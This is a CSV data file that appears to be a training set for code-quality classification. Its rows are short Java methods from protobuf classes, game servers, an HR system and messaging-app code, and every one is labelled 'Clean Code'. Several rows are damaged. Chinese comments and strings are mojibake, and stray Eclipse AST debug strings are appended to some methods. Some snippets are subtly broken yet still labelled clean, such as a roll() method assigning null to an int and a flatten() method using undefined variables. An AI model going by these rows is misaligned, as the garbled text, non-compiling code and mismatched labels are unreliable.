text,label,text_label
"/** 
 * <code>optional uint32 roll_shop_id = 15;</code>
 * @return the rollShopId
 */
public int getRollShopId(){
  return rollShopId;
}",0,Clean Code
"/** 
 * <code>repeated .RelicAffix sub_affix_list = 4;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableSubAffixList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RelicAffixOuterClass.RelicAffix> getSubAffixList(){
  return subAffixList;
}",0,Clean Code
"/** 
 * <code>optional uint32 prop_id = 4;</code>
 * @return the propId
 */
public int getPropId(){
  return propId;
}",0,Clean Code
"@Override public int getId(){
  return (GroupID << 16) + StarCount;
}",0,Clean Code
"/** 
 * <code>repeated .Shop shop_list = 8;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<ShopOuterClass.Shop> getMutableShopList(){
  bitField0_|=0x00000004;
  return shopList;
}",0,Clean Code
"@Override public String getSessionId(){
  return null;
}
",0,Clean Code
"@Test public void testZrevrangeByLex(){
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"");
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"",1337,1338);
}",0,Clean Code
"@Override public RelicArchive mergeFrom(final RelicArchive other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasRelicId()) {
    setRelicId(other.relicId);
  }
  if (other.hasSlot()) {
    setSlot(other.slot);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@762201ef!org.eclipse.jdt.core.dom.MethodDeclaration@152fd45",0,Clean Code
"public Integer getDimensions(){
  return this.dimensions;
}
",0,Clean Code
"@PostMapping(""/adminAddEmployee"") @ApiOperation(""浠庣郴缁熺敤鎴锋坊鍔犲憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result adminAddEmployee(@RequestBody List<AddEmployeeBO> employeeList){
  List<OperationLog> operationLogs=employeeService.adminAddEmployee(employeeList);
  return OperationResult.ok(operationLogs);
}
",0,Clean Code
"/** 
 * <code>repeated uint32 text_join_id_list = 3;</code>
 * @param value the textJoinIdList to add
 * @return this
 */
public TextJoinQueryCsReq addTextJoinIdList(final int value){
  bitField0_|=0x00000001;
  textJoinIdList.add(value);
  return this;
}",0,Clean Code
"public int getSizeOfUnmatchedFunctions(final ESide side){
  return metadata.getSizeOfUnmatchedFunctions(side);
}
",0,Clean Code
"@Override public List<HrmEmployee> queryBecomeEmpListByTime(LocalDate time,Collection<Long> employeeIds){
  return employeeMapper.queryBecomeEmpListByTime(time,employeeIds);
}
",0,Clean Code
"MockLVQPackedVectors(LocallyAdaptiveVectorQuantization lvq,List<VectorFloat<?>> vectors,Path testDirectory) throws IOException {
  var ravv=new ListRandomAccessVectorValues(vectors,lvq.globalMean.length());
  var encodedVectors=lvq.encodeAll(ravv);
  var lvqPath=testDirectory.resolve(""lvq"" + System.nanoTime());
  try (var out=TestUtil.openDataOutputStream(lvqPath)){
    for (    var encodedVector : encodedVectors) {
      encodedVector.writePacked(out);
    }
  }
   var dimension=lvq.globalMean.length();
  this.reader=new SimpleMappedReader(lvqPath);
  this.encodedVectorSize=2 * Float.BYTES + ((dimension % 64 == 0) ? dimension : ((dimension / 64 + 1) * 64));
  this.packedVector=vectorTypeSupport.createByteSequence(encodedVectorSize - 2 * Float.BYTES);
}",0,Clean Code
"@TruffleBoundary public final VmCollection flatten(){
  var builder=builder();
  for (  var elem : this) {
    if (elem instanceof Iterable<?>) {
      builder.addAll(iterable);
    }
 else     if (elem instanceof VmListing) {
      listing.forceAndIterateMemberValues((key,member,value) -> {
        builder.add(value);
        return true;
      }
);
    }
 else {
      CompilerDirectives.transferToInterpreter();
      throw new VmExceptionBuilder().evalError(""cannotFlattenCollectionWithNonCollectionElement"").withProgramValue(""Element"",elem).build();
    }
  }
  return builder.build();
}
",0,Clean Code
"@Override public void actionPerformed(final ActionEvent unused){
  dialog.setVisible(false);
  dialog.dispose();
}
",0,Clean Code
"public Builder withIndex(String index){
  Assert.hasText(index,""index must have a value"");
  this.index=index;
  return this;
}
",0,Clean Code
"public void removeListener(){
  graph.getView().getCanvasComponent().removeMouseListener(this);
}
",0,Clean Code
"public static void throwBy(boolean expression,String code,String msg){
  if (expression) {
    if (StrUtil.isBlank(msg)) {
      msg="""";
    }
    throw new XzException(code,msg);
  }
}
",0,Clean Code
"/** 
 * collector use - to get the next set of priority metric group tasks
 * @param metrics Current Metrics
 * @param first   Is it the first time to get
 * @return Metrics TasksReturning null means: the job has been completed, and the collection of all metrics has ended Returning the empty set metrics that there are still metrics collection tasks at the current level that have not been completed,and the next level metrics task collection cannot be performed. The set returned empty means that there are still indicator collection tasks unfinished at the current level, and the task collection at the next level cannot be carried out Returns a set of data representation: get the next set of priority index collcet tasks
 */
public synchronized Set<Metrics> getNextCollectMetrics(Metrics metrics,boolean first){
  if (priorMetrics == null || priorMetrics.isEmpty()) {
    return null;
  }
  Set<Metrics> metricsSet=priorMetrics.peek();
  if (first) {
    if (metricsSet.isEmpty()) {
      log.error(""metrics must has one [availability] metrics at least."");
    }
    return metricsSet;
  }
  if (metrics == null) {
    log.error(""metrics can not null when not first get"");
    return null;
  }
  if (!metricsSet.remove(metrics)) {
    log.warn(""Job {} appId {} app {} metrics {} remove empty error in priorMetrics."",id,monitorId,app,metrics.getName());
  }
  if (metricsSet.isEmpty()) {
    priorMetrics.poll();
    if (priorMetrics.isEmpty()) {
      return null;
    }
    Set<Metrics> source=priorMetrics.peek();
    return new HashSet<>(source);
  }
 else {
    return Collections.emptySet();
  }
}
",0,Clean Code
"public static String getUser(HttpServletRequest request){
  if (request == null) {
    return null;
  }
  return getUser(request.getHeader(API_ACCESS_KEY),request.getHeader(API_SIGNATURE));
}
public static String getUser(String accessKey,String signature){
  if (StringUtils.isBlank(accessKey) || StringUtils.isBlank(signature)) {
    return null;
  }
  UserKey userKey=CommonBeanFactory.getBean(UserKeyService.class).getUserKey(accessKey);
  if (userKey == null) {
    throw new RuntimeException(""invalid accessKey"");
  }
  if (BooleanUtils.isFalse(userKey.getEnable())) {
    throw new RuntimeException(""accessKey is disabled"");
  }
  if (BooleanUtils.isFalse(userKey.getForever())) {
    if (userKey.getExpireTime() == null || userKey.getExpireTime() < System.currentTimeMillis()) {
      throw new RuntimeException(""accessKey is expired"");
    }
  }
  String signatureDecrypt;
  try {
    signatureDecrypt=CodingUtils.aesDecrypt(signature,userKey.getSecretKey(),accessKey);
  }
 catch (  Throwable t) {
    throw new RuntimeException(""invalid signature"");
  }
  String[] signatureArray=StringUtils.split(StringUtils.trimToNull(signatureDecrypt),""|"");
  if (signatureArray.length < 2) {
    throw new RuntimeException(""invalid signature"");
  }
  if (!StringUtils.equals(accessKey,signatureArray[0])) {
    throw new RuntimeException(""invalid signature"");
  }
  long signatureTime;
  try {
    signatureTime=Long.parseLong(signatureArray[signatureArray.length - 1]);
  }
 catch (  Exception e) {
    throw new RuntimeException(e);
  }
  if (Math.abs(System.currentTimeMillis() - signatureTime) > 1800000) {
    throw new RuntimeException(""expired signature"");
  }
  return userKey.getCreateUser();
}",0,Clean Code
"@Override protected String getValueName(BlockEntityType<?> value){
  String name=""Unknown"";
  if (value == BlockEntityType.FURNACE)   name=""Furnace"";
 else   if (value == BlockEntityType.CHEST)   name=""Chest"";
 else   if (value == BlockEntityType.TRAPPED_CHEST)   name=""Trapped Chest"";
 else   if (value == BlockEntityType.ENDER_CHEST)   name=""Ender Chest"";
 else   if (value == BlockEntityType.DISPENSER)   name=""Dispenser"";
 else   if (value == BlockEntityType.DROPPER)   name=""Dropper"";
 else   if (value == BlockEntityType.HOPPER)   name=""Hopper"";
 else   if (value == BlockEntityType.SHULKER_BOX)   name=""Shulker Box"";
 else   if (value == BlockEntityType.BARREL)   name=""Barrel"";
 else   if (value == BlockEntityType.SMOKER)   name=""Smoker"";
 else   if (value == BlockEntityType.BLAST_FURNACE)   name=""Blast Furnace"";
  return name;
}
",0,Clean Code
"@Override public void addInterceptors(InterceptorRegistry registry){
  registry.addInterceptor(userTypeInterceptor()).addPathPatterns(""/**"").excludePathPatterns(""/blog/**"",""/editor/**"",""/error"");
}
",0,Clean Code
"public static String computeCompanyAge(Integer companyAge){
  if (companyAge <= 0) {
    return """";
  }
  int year=companyAge / 365;
  int month=(companyAge % 365) / 30;
  int day=(companyAge % 365) % 30;
  StringBuilder sb=new StringBuilder();
  if (year != 0) {
    sb.append(year).append(""骞�"");
  }
  if (month != 0) {
    sb.append(month).append(""鏈�"");
  }
  if (day != 0) {
    sb.append(day).append(""澶�"");
  }
  return sb.toString();
}",0,Clean Code
"@Override public String toString(){
  return ""MetaStringBytes{"" + ""hashCode="" + hashCode + "", size=""+ bytes.length+ "", bytes=""+ Arrays.toString(bytes)+ '}';
}
",0,Clean Code
"/** 
 * @param method the method to set
 */
public void setMethod(String method){
  this.method=method;
}
",0,Clean Code
"/** 
 * <code>optional string text = 15;</code>
 * @return the text
 */
public String getText(){
  return text.getString();
}",0,Clean Code
"@Override public String toString(){
  return ""DeleteRecruitChannelBO{"" + ""deleteChannelId="" + deleteChannelId + "", changeChannelId=""+ changeChannelId+ '}';
}
",0,Clean Code
"/** 
 * 鎵归噺鍒犻櫎鏂囦欢
 * @param keys key鍒楄〃
 */
public void deleteFileBatch(List<String> keys);
/** 
 * 鎵归噺鍒犻櫎鏂囦欢
 * @param keys       key鍒楄〃
 * @param bucketName 妗跺悕绉�
 */
public void deleteFileBatch(List<String> keys,String bucketName);
",0,Clean Code
"public EVisibilityFilter getVisibilityFilter(){
  if (visibilityCombo.getValue().equals(FILTER_ITEM_VISIBLE)) {
    return EVisibilityFilter.VISIBLE;
  }
 else   if (visibilityCombo.getValue().equals(FILTER_ITEM_INVISIBLE)) {
    return EVisibilityFilter.INVISIBLE;
  }
  return EVisibilityFilter.NONE;
}
",0,Clean Code
"@Test @DisplayName(""it should honor the polling interval from annotations and config"") void threadCountTest() throws NoSuchMethodException {
  var config=new TestWorkerConfig();
  var worker=new MultipleInputParams();
  var worker2=new AnotherAnnotationInput();
  AnnotatedWorkerExecutor annotatedWorkerExecutor=new AnnotatedWorkerExecutor(mock(TaskClient.class),config);
  annotatedWorkerExecutor.addBean(worker);
  annotatedWorkerExecutor.addBean(worker2);
  annotatedWorkerExecutor.startPolling();
  TaskRunnerConfigurer runner=annotatedWorkerExecutor.getTaskRunner();
  assertNotNull(runner);
  Map<String,Integer> taskThreadCount=runner.getTaskThreadCount();
  assertNotNull(taskThreadCount);
  assertEquals(3,taskThreadCount.get(""test_1""));
  assertEquals(1,taskThreadCount.get(""test_2""));
  annotatedWorkerExecutor.shutdown();
  config.setThreadCount(""test_2"",2);
  annotatedWorkerExecutor=new AnnotatedWorkerExecutor(mock(TaskClient.class),config);
  annotatedWorkerExecutor.addBean(worker);
  annotatedWorkerExecutor.addBean(worker2);
  annotatedWorkerExecutor.startPolling();
  runner=annotatedWorkerExecutor.getTaskRunner();
  taskThreadCount=runner.getTaskThreadCount();
  assertNotNull(taskThreadCount);
  assertEquals(3,taskThreadCount.get(""test_1""));
  assertEquals(2,taskThreadCount.get(""test_2""));
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  VertexAiGeminiChatOptions other=(VertexAiGeminiChatOptions)obj;
  if (stopSequences == null) {
    if (other.stopSequences != null)     return false;
  }
 else   if (!stopSequences.equals(other.stopSequences))   return false;
  if (temperature == null) {
    if (other.temperature != null)     return false;
  }
 else   if (!temperature.equals(other.temperature))   return false;
  if (topP == null) {
    if (other.topP != null)     return false;
  }
 else   if (!topP.equals(other.topP))   return false;
  if (topK == null) {
    if (other.topK != null)     return false;
  }
 else   if (!topK.equals(other.topK))   return false;
  if (candidateCount == null) {
    if (other.candidateCount != null)     return false;
  }
 else   if (!candidateCount.equals(other.candidateCount))   return false;
  if (maxOutputTokens == null) {
    if (other.maxOutputTokens != null)     return false;
  }
 else   if (!maxOutputTokens.equals(other.maxOutputTokens))   return false;
  if (model == null) {
    if (other.model != null)     return false;
  }
 else   if (!model.equals(other.model))   return false;
  if (functionCallbacks == null) {
    if (other.functionCallbacks != null)     return false;
  }
 else   if (!functionCallbacks.equals(other.functionCallbacks))   return false;
  if (functions == null) {
    if (other.functions != null)     return false;
  }
 else   if (!functions.equals(other.functions))   return false;
  return true;
}
",0,Clean Code
"public static void normalizeFlags(TLRPC.Message message){
  if (message.from_id == null) {
    message.flags&=~256;
  }
  if (message.from_id == null) {
    message.flags&=~4;
  }
  if (message.reply_to == null) {
    message.flags&=~8;
  }
  if (message.media == null) {
    message.flags&=~512;
  }
  if (message.reply_markup == null) {
    message.flags&=~64;
  }
  if (message.replies == null) {
    message.flags&=~8388608;
  }
  if (message.reactions == null) {
    message.flags&=~1048576;
  }
}",0,Clean Code
"/** 
 * @param mouseButton one of the MOUSE_* constants of this class.
 */
public void sendMouseEvent(int mouseButton,int column,int row,boolean pressed){
  if (column < 1)   column=1;
  if (column > mColumns)   column=mColumns;
  if (row < 1)   row=1;
  if (row > mRows)   row=mRows;
  if (mouseButton == MOUSE_LEFT_BUTTON_MOVED && !isDecsetInternalBitSet(DECSET_BIT_MOUSE_TRACKING_BUTTON_EVENT)) {
  }
 else   if (isDecsetInternalBitSet(DECSET_BIT_MOUSE_PROTOCOL_SGR)) {
    mSession.write(String.format(""\033[<%d;%d;%d"" + (pressed ? 'M' : 'm'),mouseButton,column,row));
  }
 else {
    mouseButton=pressed ? mouseButton : 3;
    boolean out_of_bounds=column > 255 - 32 || row > 255 - 32;
    if (!out_of_bounds) {
      byte[] data={'\033','[','M',(byte)(32 + mouseButton),(byte)(32 + column),(byte)(32 + row)};
      mSession.write(data,0,data.length);
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 MMFONFFPNJM = 8;</code>
 * @return this
 */
public RogueMiracleDataInfo clearMMFONFFPNJM(){
  bitField0_&=~0x00000002;
  mMFONFFPNJM=0;
  return this;
}",0,Clean Code
"public String getXmlContent(){
  return this.xmlContent;
}
",0,Clean Code
"@Override public void onTearDown(){
  if (isTornDown()) {
    return;
  }
  if (mPlaceholderListener != null) {
    mPlaceholderListener.invalidate();
  }
  if (mMainListener != null) {
    mMainListener.invalidate();
  }
  super.onTearDown();
  if (mNativeQuad != null) {
    mNativeQuad.dispose();
    mNativeQuad=null;
  }
  if (mDefaultMaterial != null) {
    mDefaultMaterial.dispose();
    mDefaultMaterial=null;
  }
  if (mLatestImage != null) {
    mLatestImage.destroy();
    mLatestImage=null;
  }
  if (mLatestImageTexture != null) {
    mLatestImageTexture.dispose();
    mLatestImageTexture=null;
  }
}
",0,Clean Code
"public static void extractRootfs(Context context,boolean romExist,boolean needsUpgrade,boolean forceInstall,boolean use3rdRom){
  removeSystemPartition(context);
  removeVendorPartition(context);
  if (!romExist) {
    extractRootfsInAssets(context);
    return;
  }
  if (forceInstall) {
    if (use3rdRom) {
      boolean success=extract3rdRootfs(context);
      if (!success) {
        showRootfsInstallationFailure(context);
        return;
      }
    }
 else {
      if (!extractRootfsInAssets(context)) {
        showRootfsInstallationFailure(context);
        return;
      }
    }
    AppKV.setBooleanConfig(context,AppKV.FORCE_ROM_BE_RE_INSTALL,false);
  }
 else {
    if (use3rdRom) {
      Log.w(TAG,""WTF? 3rd ROM must be force install!"");
    }
    if (needsUpgrade) {
      Log.i(TAG,""upgrade factory rom.."");
      if (!extractRootfsInAssets(context)) {
        showRootfsInstallationFailure(context);
      }
    }
  }
}
public static int extractRootfs(Context context,File rootfs7z){
  int cpu=Runtime.getRuntime().availableProcessors();
  return P7ZipApi.executeCommand(String.format(Locale.US,""7z x -mmt=%d -aoa '%s' '-o%s'"",cpu,rootfs7z,context.getDataDir()));
}",0,Clean Code
"public Float getRepetitionPenalty(){
  return repetitionPenalty;
}
",0,Clean Code
"public String getEventName(){
  return bundle.getString(""EVENT_NAME"");
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4ec7bd88",0,Clean Code
"void changedY(CBend bend,double y);
",0,Clean Code
"private static void home(){
  String s=AntStallRpcCall.home();
  try {
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      if (!jo.getBoolean(""hasRegister"") || jo.getBoolean(""hasQuit"")) {
        Log.farm(""铓傝殎鏂版潙鉀鍏堝紑鍚殏铓佹柊鏉�"");
        return;
      }
      JSONObject astReceivableCoinVO=jo.getJSONObject(""astReceivableCoinVO"");
      if (astReceivableCoinVO.optBoolean(""hasCoin"")) {
        settleReceivable();
      }
      if (Config.stallThrowManure()) {
        throwManure();
      }
      JSONObject seatsMap=jo.getJSONObject(""seatsMap"");
      settle(seatsMap);
      collectManure();
      sendBack(seatsMap);
      if (Config.stallAutoClose()) {
        closeShop();
      }
      if (Config.stallAutoOpen()) {
        openShop();
      }
      taskList();
      achieveBeShareP2P();
      if (Config.stallDonate()) {
        roadmap();
      }
    }
 else {
      Log.recordLog(""home err:"",s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""home err:"");
    Log.printStackTrace(TAG,t);
  }
}",0,Clean Code
"/** 
 * Returns an array of the property names on the given script object.
 */
private Object[] getObjectIdsImpl(Context cx,Object object){
  if (!(object instanceof Scriptable) || object == Undefined.instance) {
    return Context.emptyArgs;
  }
  Object[] ids;
  Scriptable scriptable=(Scriptable)object;
  if (scriptable instanceof DebuggableObject) {
    ids=((DebuggableObject)scriptable).getAllIds();
  }
 else {
    ids=scriptable.getIds();
  }
  Scriptable proto=scriptable.getPrototype();
  Scriptable parent=scriptable.getParentScope();
  int extra=0;
  if (proto != null) {
    ++extra;
  }
  if (parent != null) {
    ++extra;
  }
  if (extra != 0) {
    Object[] tmp=new Object[extra + ids.length];
    System.arraycopy(ids,0,tmp,extra,ids.length);
    ids=tmp;
    extra=0;
    if (proto != null) {
      ids[extra++]=""__proto__"";
    }
    if (parent != null) {
      ids[extra++]=""__parent__"";
    }
  }
  return ids;
}",0,Clean Code
"@Override public void removedBend(final CViewEdge<?> edge,final int index,final CBend bend){
  bend.removeListener(m_listener);
  if (m_realizer.bendCount() == m_rawEdge.getBendCount()) {
    return;
  }
  m_realizer.removeBend(m_realizer.getBend(index));
}
@Override public void removedBend(final ZyEdgeRealizer<EdgeTypeT> realizer,final int position){
  m_rawEdge.removeBend(position);
}
",0,Clean Code
"private KNNModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private KNNModelProto(){
  vectors_=java.util.Collections.emptyList();
  outputs_=java.util.Collections.emptyList();
  parallelBackend_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@496819a6",0,Clean Code
"public void roll(ItemParamMap drops){
  if (this.chance < 1000) {
    int random=Utils.randomRange(0,999);
    if (random > this.chance) {
      return;
    }
  }
  var count=BigDecimal.valueOf(generateCount());
  var rates=LunarCore.getConfig().getServerRates();
  while (count.doubleValue() > 0) {
    int itemId=generateItemId();
    ItemExcel excel=GameData.getItemExcelMap().get(itemId);
    if (excel == null)     break;
    if (excel.isEquippable()) {
      if (rates.getEquip() > 0) {
        drops.addTo(itemId,1);
        count=count.subtract(BigDecimal.valueOf(1.0 / rates.getEquip()));
      }
 else {
        count=count.subtract(BigDecimal.ONE);
      }
    }
 else {
      int amount=null;
      if (amount > 0) {
        drops.addTo(itemId,amount);
      }
      count=BigDecimal.ZERO;
    }
  }
}",0,Clean Code
"@Override public SetFriendMarkScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  uid=0;
  retcode=0;
  isSetMark=false;
  return this;
}",0,Clean Code
"@TruffleBoundary private UnmodifiableEconomicSet<Object> collectAllRegularPropertyNames(){
  if (EconomicMaps.isEmpty(declaredProperties)) {
    return superclass == null ? EconomicSet.create() : superclass.getAllRegularPropertyNames();
  }
  var size=superclass == null ? 0 : superclass.getAllRegularPropertyNames().size();
  var result=EconomicSet.create(size);
  for (  var property : EconomicMaps.getValues(declaredProperties)) {
    if (!(property.isLocal() || isHiddenProperty(property.getName()) || property.isExternal())) {
      result.add(property.getName());
    }
  }
  if (superclass == null) {
    return result;
  }
  if (result.isEmpty()) {
    return superclass.getAllRegularPropertyNames();
  }
  result.addAll(superclass.getAllRegularPropertyNames());
  return result;
}",0,Clean Code
"/** 
 * Returns the set of permissions corresponding to a given  {@code String}representation. <p> The  {@code perms} parameter is a {@code String} representing thepermissions. It has 9 characters that are interpreted as three sets of three. The first set refers to the owner's permissions; the next to the group permissions and the last to others. Within each set, the first character is  {@code 'r'} to indicate permission to read, the secondcharacter is  {@code 'w'} to indicate permission to write, and the thirdcharacter is  {@code 'x'} for execute permission. Where a permission isnot set then the corresponding character is set to  {@code '-'}. <p> <b>Usage Example:</b> Suppose we require the set of permissions that indicate the owner has read, write, and execute permissions, the group has read and execute permissions and others have none. <pre> Set&lt;FilePermission&gt; perms = FilePermissions.fromString(""rwxr-x---""); </pre>
 * @param perms string representing a set of permissions
 * @return  the resulting set of permissions
 * @throws IllegalArgumentException if the string cannot be converted to a set of permissions
 * @see #toString(Set)
 */
public static Set<FilePermission> fromString(String perms){
  if (perms.length() != 9)   throw new IllegalArgumentException(""Invalid mode"");
  Set<FilePermission> result=EnumSet.noneOf(FilePermission.class);
  if (isR(perms.charAt(0)))   result.add(OWNER_READ);
  if (isW(perms.charAt(1)))   result.add(OWNER_WRITE);
  if (isX(perms.charAt(2)))   result.add(OWNER_EXECUTE);
  if (isR(perms.charAt(3)))   result.add(GROUP_READ);
  if (isW(perms.charAt(4)))   result.add(GROUP_WRITE);
  if (isX(perms.charAt(5)))   result.add(GROUP_EXECUTE);
  if (isR(perms.charAt(6)))   result.add(OTHERS_READ);
  if (isW(perms.charAt(7)))   result.add(OTHERS_WRITE);
  if (isX(perms.charAt(8)))   result.add(OTHERS_EXECUTE);
  return result;
}",0,Clean Code
"/** 
 * <code>optional uint32 relic_unique_id = 10;</code>
 * @return the relicUniqueId
 */
public int getRelicUniqueId(){
  return relicUniqueId;
}",0,Clean Code
"private List<? extends KeyReference> createKey(Object[] keys){
  boolean[] reclaimedFlags=new boolean[keys.length];
  if (GraalvmSupport.isGraalBuildtime()) {
    List<NoCallbackRef> keyRefs=new ArrayList<>();
    for (    Object key : keys) {
      keyRefs.add(new NoCallbackRef(key));
    }
    return keyRefs;
  }
  List<FinalizableKeyReference> keyRefs=new ArrayList<>();
  for (int i=0; i < keys.length; i++) {
    keyRefs.add(new FinalizableKeyReference(keys[i],keyRefs,reclaimedFlags,i));
  }
  return keyRefs;
}",0,Clean Code
"@Override public void mouseReleased(final MouseEvent event){
  if (event.isPopupTrigger()) {
    showPopupMenu(event);
  }
}
",0,Clean Code
"private EvaluatorBuilder(){
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)24);
    output.writeUInt32NoTag(equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(baseAvatarId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)80);
    output.writeUInt32NoTag(equipAvatarId);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.equipmentUniqueId,equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.baseAvatarId,baseAvatarId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.equipAvatarId,equipAvatarId);
  }
  output.endObject();
}",0,Clean Code
"public ZhipuChatHeaderAuthorizationInterceptor(String key,String secret){
  this.key=key;
  this.secret=secret;
}
",0,Clean Code
"@Override public void handleLoadPackage(){
  initHook(UseThirdPartyBrowser.INSTANCE,mPrefsMap.getBoolean(""content_extension_browser""));
  initHook(new DisableChatWatermark(),mPrefsMap.getBoolean(""voiceassist_disable_watermark""));
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetGachaInfoScRsp}
 */
public static GetGachaInfoScRsp newInstance(){
  return new GetGachaInfoScRsp();
}
",0,Clean Code
"private void openItem(CacheModel.FileInfo fileInfo,CacheCell cacheCell){
  RecyclerListView recyclerListView=(RecyclerListView)viewPagerFixed.getCurrentView();
  if (cacheCell.type == TYPE_DOCUMENTS) {
    if (!(recyclerListView.getAdapter() instanceof DocumentsAdapter)) {
      return;
    }
    DocumentsAdapter documentsAdapter=(DocumentsAdapter)recyclerListView.getAdapter();
    PhotoViewer.getInstance().setParentActivity(parentFragment);
    if (placeProvider == null) {
      placeProvider=new BasePlaceProvider();
    }
    placeProvider.setRecyclerListView(recyclerListView);
    if (fileIsMedia(fileInfo.file)) {
      ArrayList<Object> photoEntries=new ArrayList<>();
      photoEntries.add(new MediaController.PhotoEntry(0,0,0,fileInfo.file.getPath(),0,fileInfo.type == TYPE_VIDEOS,0,0,0));
      ;
      PhotoViewer.getInstance().openPhotoForSelect(photoEntries,0,PhotoViewer.SELECT_TYPE_NO_SELECT,false,placeProvider,null);
    }
 else {
      AndroidUtilities.openForView(fileInfo.file,fileInfo.file.getName(),null,parentFragment.getParentActivity(),null);
    }
  }
  if (cacheCell.type == TYPE_MUSIC) {
    if (MediaController.getInstance().isPlayingMessage(fileInfo.messageObject)) {
      if (!MediaController.getInstance().isMessagePaused()) {
        MediaController.getInstance().pauseMessage(fileInfo.messageObject);
      }
 else {
        MediaController.getInstance().playMessage(fileInfo.messageObject);
      }
    }
 else {
      MediaController.getInstance().playMessage(fileInfo.messageObject);
    }
  }
  return;
}",0,Clean Code
